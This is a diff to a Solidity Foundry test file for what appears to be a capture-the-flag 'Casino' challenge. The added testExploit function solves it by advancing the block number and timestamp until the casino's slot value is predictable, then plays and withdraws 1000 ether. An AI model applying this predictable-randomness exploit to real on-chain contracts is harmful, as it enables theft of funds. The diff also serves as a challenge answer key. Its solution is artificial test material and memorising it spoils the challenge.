@@ -8,9 +8,9 @@ import {CasinoBase, Casino} from "src/Casino/Casino.sol";
 contract CasinoTest is Test {
     CasinoBase public base;
     Casino public casino;
+
     address public wNative;
-    address public you;
-    address public owner;
+    address public challenger;
 
     function setUp() external {
         uint256 startTime = block.timestamp + 60;
@@ -18,11 +18,28 @@ contract CasinoTest is Test {
         uint256 fullScore = 100;
 
         base = new CasinoBase(startTime, endTime, fullScore);
-        you = makeAddr("you");
-        wNative = address(base.wNative());
         base.setup();
         casino = base.casino();
+        wNative = address(base.wNative());
+
+        challenger = makeAddr("challenger");
     }
 
-    function testExploit() public {}
+    function testExploit() public {
+        vm.startPrank(challenger);
+        for (uint256 i; i < 100; ++i) {
+            vm.roll(block.number + i);
+            vm.warp(block.timestamp + i);
+
+            if (casino.slot() == 10) {
+                casino.play(wNative, 100 ether);
+            }
+        }
+
+        casino.withdraw(wNative, 1000 ether);
+        vm.stopPrank();
+
+        base.solve();
+        assertTrue(base.isSolved());
+    }
 }
